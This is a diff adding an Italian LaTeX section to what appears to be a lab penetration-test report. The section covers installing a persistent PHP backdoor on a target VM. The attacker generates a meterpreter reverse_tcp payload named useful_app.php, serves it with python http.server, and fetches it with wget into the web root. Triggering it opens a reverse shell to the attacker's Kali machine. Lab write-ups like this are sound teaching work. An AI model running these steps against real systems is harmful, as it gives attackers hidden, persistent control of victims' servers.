@@ -756,5 +756,83 @@ Per confermare che si stia effettivamente utilizzando una shell di root, è poss
 Come è possibile notare, la fase di Privilege Escalation è stata completata con successo, essendo riusciti ad ottenere il \textbf{massimo privilegio possibile}.
 
 \newpage
+\section{Maintaning access: installazione di una backdoor}
+L'ultima parte del processo di analisi dell'asset consiste nel tentare di installare una \textbf{backdoor} per controllarlo senza dover necessariamente veicolare nuovamente l'exploit descritto nelle fasi precedenti.
+
+Poiché nella fase di enumerazione era stata riscontrata la presenza di pagine \texttt{.php} si può assumere che l'asset presenti un'installazione di PHP e, dunque, che l'installazione di una backdoor che faccia uso di tale linguaggio di programmazione possa avere successo.
+
+A tal scopo è stato utilizzato il tool \texttt{msfvenom}, invocabile dalla console di \textbf{Metasploit} e che permette la generazione semi-automatica di payload utilizzabili anche come backdoor.\cite{msfvenom}
+
+Il payload utilizzato consiste in \texttt{php/meterpreter/reverse\_tcp} a cui è stato specificato il parametro \texttt{LHOST} specificando l'indirizzo IP della macchina Kali e salvato nel file \texttt{useful\_app.php}. Questo payload permette, tra le altre cose, l'apertura di una \textbf{reverse shell} sulla macchina dell'attaccante quando contattato tramite HTTP.\footnote{Il payload creato contiene all'inizio il simbolo \texttt{/*}, che in PHP rappresenta un commento. Per rendere il file effettivamente eseguibile è necessario dunque rimuoverlo.}
+
+\begin{figure}[h!]
+    \centering
+    \includegraphics[width=\textwidth]{img/msfvenom.png}
+    \caption{La creazione del Payload}
+\end{figure}
+
+Tale payload verrà scaricato sulla macchina target dalla shell di root aperta mediante l'exploit e la fase di privilege escalation veicolata in precedenza. Questo processo si articola in due fasi.
+
+\begin{enumerate}
+    \item Innanzitutto, è necessario aprire un piccolo server web sulla macchina Kali per permettere all'asset di prelevare il file;
+    \item Successivamente, mediante il comando \texttt{wget}, l'asset preleverà la risorsa \texttt{useful\_app.php} dalla macchina Kali.
+\end{enumerate}
+
+\subsection{Trasferimento della backdoor}
+Per ottenere il risultato richiesto da \texttt{(1)} è possibile utilizzare \textbf{python} ed in particolare il modulo \texttt{http.server} in questo modo:
+
+\begin{center}
+    \texttt{python -m http.server 8084}
+\end{center}
+
+dove \texttt{8084} è la porta in cui il server accetterà connessioni. Questo comando va eseguito nella stessa cartella dove è presente il payload.
+
+Per quanto riguarda invece la \texttt{(2)}, avendo già a disposizione la shell di root nell'asset, è sufficiente spostarsi nella directory \texttt{/var/www/html/} e lanciare il comando
+
+\begin{center}
+    \texttt{wget 192.168.64.23:8084/useful\_app.php}
+\end{center}
+
+\begin{figure}[h!]
+    \centering
+    \includegraphics[width=\textwidth]{img/wget.png}
+    \caption{Trasferimento della backdoor}
+\end{figure}
+
+\subsection{Creazione dell'handler}
+A questo punto, è necessario creare l'handler che si metterà in ascolto sulla macchina Kali. Il modulo di Metasploit di riferimento è il generico \texttt{exploit/multi/handler} ed utilizza come payload \texttt{php/meterpreter/reverse\_tcp}. Essendo questo un contesto \textbf{reverse} è necessario specificare solamente il parametro \texttt{LHOST}, che deve contenere l'indirizzo della macchina dell'attaccante. 
+
+\subsection{Esecuzione della backdoor}
+
+L'attivazione della backdoor avviene in tre step:
+
+\begin{enumerate}
+    \item L'handler viene attivato mediante il comando \texttt{run};
+    \item Il web server su cui è stato caricato l'exploit viene contattato dall'esterno mediante \texttt{http://192.168.64.21/useful\_app.php};
+    \item Il web server contatta la macchina Kali e riceve il payload per l'apertura della reverse shell;
+\end{enumerate}
+
+Il risultato viene mostrato qui di seguito:
+
+\begin{figure}[h!]
+    \centering
+    \includegraphics[width=\textwidth]{img/handler.png}
+    \caption{Attivazione dell'handler}
+\end{figure}
+
+Come si nota, una sessione \textbf{meterpreter} è stata aperta ed è, di conseguenza, possibile diventare root utilizzando la stessa strategia mostrata in precedenza, utilizzando il comando \texttt{shell -t} da meterpreter, effettuando il login con \texttt{noobbox} eseguendo l'editor \texttt{vim}.
+
+\newpage
+\begin{figure}[h!]
+    \centering
+    \includegraphics[width=\textwidth]{img/backdoor_root.png}
+    \caption{Utilizzo della backdoor}
+\end{figure}
+
+Essendo la backdoor salvata nella root del web server, questa sarà \textbf{disponibile anche successivamente ad un riavvio del sistema}.
+
+Anche la fase di \textbf{Mantaining access} può dirsi, quindi, \textbf{completata con successo}.
+
+\newpage
 \printbibliography[title={Riferimenti bibliografici e risorse consultate}]
 \end{document}
